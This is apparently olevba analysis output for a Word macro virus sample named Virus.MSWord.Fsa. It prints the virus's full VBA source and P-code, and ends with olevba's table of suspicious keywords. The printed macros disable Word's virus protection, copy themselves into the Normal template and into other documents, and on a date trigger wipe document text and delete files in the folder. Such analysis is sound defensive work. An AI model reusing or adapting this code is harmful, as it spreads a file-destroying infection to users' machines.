olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fsa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fsa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO hello.bas 
in file: Virus.MSWord.Fsa - OLE stream: 'Macros/VBA/hello'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.autoopen.autoopen"
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
 RecentFiles.Maximum = 0
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "hello" Then
        myflag = -1
    End If
Next i
If Not myflag Then

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name _
        :="hello", Object:=wdOrganizerObjectProjectItems
End If
k = ActiveDocument.FullName
iMacroCount = Application.ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If Application.ActiveDocument.VBProject.VBComponents(i).Name = "hello" Then
ActiveDocument.SaveAs FileName:="c:\temp.dot", FileFormat:=wdFormatTemplate
Application.ActiveDocument.SaveAs FileName:=k
End If
Next i
Application.ActiveDocument.SaveAs FileName:=k
Application.OrganizerCopy Source:="c:\temp.dot", Destination:=ActiveDocument.FullName, Name _
        :="hello", Object:=wdOrganizerObjectProjectItems
Application.ActiveDocument.SaveAs FileName:=k
ErrorAO:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
Sub filesave()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
 RecentFiles.Maximum = 0
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "hello" Then
        myflag = -1
    End If
Next i
If Not myflag Then

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name _
        :="hello", Object:=wdOrganizerObjectProjectItems
End If
k = ActiveDocument.FullName
iMacroCount = Application.ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If Application.ActiveDocument.VBProject.VBComponents(i).Name = "hello" Then
ActiveDocument.SaveAs FileName:="c:\temp.dot", FileFormat:=wdFormatTemplate
ActiveDocument.SaveAs FileName:=k
End If
Next i
Application.ActiveDocument.Save
Application.OrganizerCopy Source:="c:\temp.dot", Destination:=ActiveDocument.FullName, Name _
        :="hello", Object:=wdOrganizerObjectProjectItems
Application.ActiveDocument.Save
ErrorAO:
End Sub

Sub autoclose()
dt$ = Date
dt$ = Left(dt$, 2)
If dt$ = "05" Then
ActiveDocument.Save
ActiveDocument.Select
Selection.Delete
Selection.TypeText TEXT:="hello :))),"
ActiveDocument.Save
k$ = ActiveDocument.FullName
s$ = ActiveDocument.Name
n = Len(s$)
n1 = Len(k$)
n2 = n1 - n
k$ = Left(k$, n2)
myflag = True
On Error GoTo ErrorAO
myfile = Dir(k$ + "*.*")
Do While myfile <> ""
If myflag = True Then GoTo 1
ErrorAO:
myfile = Dir
1:
myflag = False
flag = False
For i = 1 To Application.Documents.Count
If myfile = Application.Documents(i).Name Then
flag = True
End If
Next i
If flag = False Then
Kill k$ + myfile
End If
Loop
End If

End Sub
Sub FileSaveAs()

On Error GoTo ErrorFSA

    Dialogs(wdDialogFileSaveAs).Show
k$ = ActiveDocument.FullName

n = Len(k$)
n = n - 3
k$ = Left(k$, n)
k$ = k$ & "doc"
ActiveDocument.SaveAs FileName:=k$
k$ = Left(k$, n)
k$ = k$ & "dot"
Kill k$
ErrorFSA:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Fsa
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/hello - 6142 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #6:
' 	OnError ErrorAO 
' Line #7:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroCount 
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #9:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "hello"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	UMi 
' 	St myflag 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	Ld myflag 
' 	Not 
' 	IfBlock 
' Line #14:
' Line #15:
' 	LineCont 0x0008 09 00 08 00 10 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "hello"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St k 
' Line #18:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroCount 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #20:
' 	Ld i 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "hello"
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitStr 0x000B "c:\temp.dot"
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #22:
' 	Ld k 
' 	ParamNamed FileName 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	Ld k 
' 	ParamNamed FileName 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #26:
' 	LineCont 0x0004 0E 00 08 00
' 	LitStr 0x000B "c:\temp.dot"
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "hello"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #27:
' 	Ld k 
' 	ParamNamed FileName 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #28:
' 	Label ErrorAO 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub ViewVBCode())
' Line #31:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #32:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #35:
' 	OnError ErrorVVBC 
' Line #36:
' 	Label ErrorVVBC 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Sub ToolsMacro())
' Line #39:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #40:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #42:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #43:
' 	OnError ErrorVVBC 
' Line #44:
' 	Label ErrorVVBC 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub filesave())
' Line #47:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #48:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #49:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #51:
' 	LitDI2 0x0000 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #52:
' 	OnError ErrorAO 
' Line #53:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroCount 
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #55:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "hello"
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitDI2 0x0001 
' 	UMi 
' 	St myflag 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	Ld myflag 
' 	Not 
' 	IfBlock 
' Line #60:
' Line #61:
' 	LineCont 0x0008 09 00 08 00 10 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "hello"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St k 
' Line #64:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroCount 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #66:
' 	Ld i 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "hello"
' 	Eq 
' 	IfBlock 
' Line #67:
' 	LitStr 0x000B "c:\temp.dot"
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #68:
' 	Ld k 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	LineCont 0x0004 0E 00 08 00
' 	LitStr 0x000B "c:\temp.dot"
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "hello"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #74:
' 	Label ErrorAO 
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Sub autoclose())
' Line #78:
' 	Ld Date 
' 	St dt$ 
' Line #79:
' 	Ld dt$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	St dt$ 
' Line #80:
' 	Ld dt$ 
' 	LitStr 0x0002 "05"
' 	Eq 
' 	IfBlock 
' Line #81:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #82:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #83:
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #84:
' 	LitStr 0x000B "hello :))),"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #85:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #86:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St k$ 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St s$ 
' Line #88:
' 	Ld s$ 
' 	FnLen 
' 	St n 
' Line #89:
' 	Ld k$ 
' 	FnLen 
' 	St n1 
' Line #90:
' 	Ld n1 
' 	Ld n 
' 	Sub 
' 	St n2 
' Line #91:
' 	Ld k$ 
' 	Ld n2 
' 	ArgsLd LBound 0x0002 
' 	St k$ 
' Line #92:
' 	LitVarSpecial (True)
' 	St myflag 
' Line #93:
' 	OnError ErrorAO 
' Line #94:
' 	Ld k$ 
' 	LitStr 0x0003 "*.*"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St myfile 
' Line #95:
' 	Ld myfile 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #96:
' 	Ld myflag 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #97:
' 	Label ErrorAO 
' Line #98:
' 	Ld Dir 
' 	St myfile 
' Line #99:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #100:
' 	LitVarSpecial (False)
' 	St myflag 
' Line #101:
' 	LitVarSpecial (False)
' 	St flag 
' Line #102:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #103:
' 	Ld myfile 
' 	Ld i 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	MemLd New 
' 	Eq 
' 	IfBlock 
' Line #104:
' 	LitVarSpecial (True)
' 	St flag 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld flag 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #108:
' 	Ld k$ 
' 	Ld myfile 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	Loop 
' Line #111:
' 	EndIfBlock 
' Line #112:
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Sub FileSaveAs())
' Line #115:
' Line #116:
' 	OnError ErrorFSA 
' Line #117:
' Line #118:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #119:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St k$ 
' Line #120:
' Line #121:
' 	Ld k$ 
' 	FnLen 
' 	St n 
' Line #122:
' 	Ld n 
' 	LitDI2 0x0003 
' 	Sub 
' 	St n 
' Line #123:
' 	Ld k$ 
' 	Ld n 
' 	ArgsLd LBound 0x0002 
' 	St k$ 
' Line #124:
' 	Ld k$ 
' 	LitStr 0x0003 "doc"
' 	Concat 
' 	St k$ 
' Line #125:
' 	Ld k$ 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #126:
' 	Ld k$ 
' 	Ld n 
' 	ArgsLd LBound 0x0002 
' 	St k$ 
' Line #127:
' 	Ld k$ 
' 	LitStr 0x0003 "dot"
' 	Concat 
' 	St k$ 
' Line #128:
' 	Ld k$ 
' 	ArgsCall Kill 0x0001 
' Line #129:
' 	Label ErrorFSA 
' Line #130:
' 	EndSub 
' Line #131:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

